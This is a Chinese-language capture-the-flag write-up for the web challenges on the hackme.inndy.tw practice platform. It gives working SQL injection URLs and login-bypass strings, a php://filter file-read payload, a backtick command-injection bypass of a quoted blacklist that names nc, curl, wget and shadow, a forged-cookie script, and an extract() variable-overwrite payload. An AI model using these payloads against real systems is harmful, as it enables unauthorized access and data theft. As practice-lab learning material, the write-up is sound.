---
title: Hackme web writeup
author: Wu Han
date: 2020-11-10 22:53:00 +0800
categories: [Competition,CTF]
tags: [Exercises]
math: false
pin: false
---

## 15 Hide and seek
当时因为是第一次来这种平台上做题，甚至不知道在哪里提交flag哈哈哈哈(划掉)。这个题目直接F12(或者Fn+F12[去除本机自带快捷键])查看源码模块，ctrl+F找flag{就行了，不多浪费时间

## 16 guestbook
当时内心os:好家伙，第二题就直接sql啊..还用了之前没用过的工具，还是有点怂的。后来下载sqlmap的时候查了一些用法[^FootNote1],发现没那么难，简单构造一下，根据sqlmap返回的注入点找到了这个
```
https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,database(),4 -- 1
```
在返回的信息里得到了数据库的表名:guestbook
趁热打铁，继续得到表名
```
https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='guestbook' limit 0,1),4 -- 1
```
表名是flag
在flag里面继续sql注入:
```
https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='flag' limit 1,1),4 -- 1
```
得到了字段名flag,继续sql
```
https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select flag from flag limit 1,1),4 -- 1
```
读出来就好啦~

## 17 LFI
yysy,这个提示在之前我还真的不太知道，专门查了一下，感觉发现了新世界，php://filter可以作为中间流处理其他流，是一个php特有的功能[^FootNote2].然后就，照猫画虎，先看看源码里面有没有和flag相关的内容，发现还真有。
```
                <li class="active">
                    <a href="?page=pages/index">Home</a>
                </li>
                <li>
                    <a href="?page=pages/intro">Introduction</a>
                </li>
<!-- There is no flag
                <li>
                    <a href="?page=pages/flag">Flag</a>
                </li>
-->
```
那就重点照顾下?page=pages/flag。显然无法直接连上，就用刚才的filter试试吧
```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag
```
出来一串奇奇怪怪的字符，一看就是老Base64了，我们解个码
```
Can you read the flag<?php require('config.php'); ?>?
```
好家伙，我还以为直接是flag，不过也差不多了，再来一次:
```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config
```

## 18 homepage
这个好水...日常F12检查元素，就发现console log里面有一个二维码，扫码就出flag了

## 19 ping
简单的审计代码问题，看到黑名单日常被吸引
```php
$blacklist = [
            'flag', 'cat', 'nc', 'sh', 'cp', 'touch', 'mv', 'rm', 'ps', 'top', 'sleep', 'sed',
            'apt', 'yum', 'curl', 'wget', 'perl', 'python', 'zip', 'tar', 'php', 'ruby', 'kill',
            'passwd', 'shadow', 'root',
            'z',
            'dir', 'dd', 'df', 'du', 'free', 'tempfile', 'touch', 'tee', 'sha', 'x64', 'g',
            'xargs', 'PATH',
            '$0', 'proc',
            '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
        ];
```
发现反引号没在表里面，就尝试构造几个试试
```
https://hackme.inndy.tw/ping/?ip=`ls`
```
知道flag在目录下的flag.php文件里
因为黑名单屏蔽了cat，所以试了试sort，又因为flag也在黑名单里，所以最好的办法就是通配符了，试
```
`sort ????????`
```
(8个?是因为flag.php有8位)即可

## 20 scoreboard
这个题还是我too young了，我想着前面几题挺难的，这个题找了好久...后来还看了别人的题解..发现原来就在请求头里。san值狂掉.jpg 不过确实给我提供了一些做题方向。

## 21 login as admin 0
下拉看过滤部分代码:
```php
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```
发现'被转义成\\\\\'
所以构造payload:
```
username = admin\' || 1=1#
password = 1
```
flag成功到手~

## 22 login as admin 0.1
根据前面一个flag的提示，这个应该是要进数据库了。用sqlmap找了一下注入点，尝试一下联合注入:
和上面sql几乎一样的操作，我写的简略一点
>name=admin\' union select 1,2,3,4#&password=1<br>
name=admin\' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#<br>
name=admin\' union  select 1,the_f14g,3,4 from h1dden_f14g#<br>

分别查列数，表名，和字段名就ok啦

## 23 login as admin 1
发现依然是上面的类型，然后注意到不同的地方在于过滤部分增加了对空格的过滤:
```php
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, ' ') || strstr($strl, '1=1') || strstr($strl, "''") ||
        strstr($strl, 'union select') || strstr($strl, 'select ')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```
emmm这个有点棘手，本身sql就没系统学过，查了一下发现*可以替代掉空格，那就试一试:
```
admin\'/**/or/**/1/**/limit/**/0,1#
```

## 24 login as admin 1.2
题目都给了boolean-based SQL injection了，那必然sqlmap安排上啊，直接搞到flag

## 25 login as admin 3
看源码里验证登录的部分出现了！=这种比较方式，就知道这个题目应该考的是弱比较，好几种脚本语言里都有弱比较和强比较的方法，基本上都是== 和===的区别。有了这个思路我们就可以构造让他$unserialized[‘sig’]=0就行了。但是我https通信协议确实接触的不多，cookies和session都还不熟qwq,后面不会构造，查了一下别人的wp:
```php
<?php 
function set_user()
{
    global $user, $secret;
    $user = ['admin', true];
    $data = json_encode($user);
    $sig = 0;
    $all = base64_encode(json_encode(['sig' => $sig, 'data' => $data]));
    return $all;
}
echo set_user();
?>
```
看上去是构造了一个cookie传数据，中间用了base64编码对数据进行处理。

## 26 login as admin 4
刚开始没发现问题，因为注入什么的已经没地方下手了。看了几遍总觉得最后的跳转有问题，查了一下redirect，参考了很多PHP实现的代码，发现题目里的代码少了exit()，我还是不知道这个exit有什么用，于是就google了一下，发现google确实是我的friend(doge)  [DAILYWTF](http://thedailywtf.com/articles/WellIntentioned-Destruction)
那就懂了，开始搞破坏（x
```
curl -d "name=admin" https://hackme.inndy.tw/login4/
```
## 27 Login as Admin 6
这个真的不太好想...第一次遇到这种题，刚开始写不出来，参考了别人的题解才写出来了。
关键代码在这:
```php
if(!empty($_POST['data'])) {
    try {
        $data = json_decode($_POST['data'], true);
    } catch (Exception $e) {
        $data = [];
    }
    extract($data);
    if($users[$username] && strcmp($users[$username], $password) == 0) {
        $user = $username;
    }
}
```
其中存在变量覆盖，构造
```
data = {"users":{"admin":"sky"},"username":"admin","password":"sky"}
```
绕过


## FootNote
[^FootNote1]:见[SQLmap Tutorial](https://hackertarget.com/sqlmap-tutorial/)
[^FootNote2]:见[php://filter 的使用](https://blog.csdn.net/destiny1507/article/details/82347371)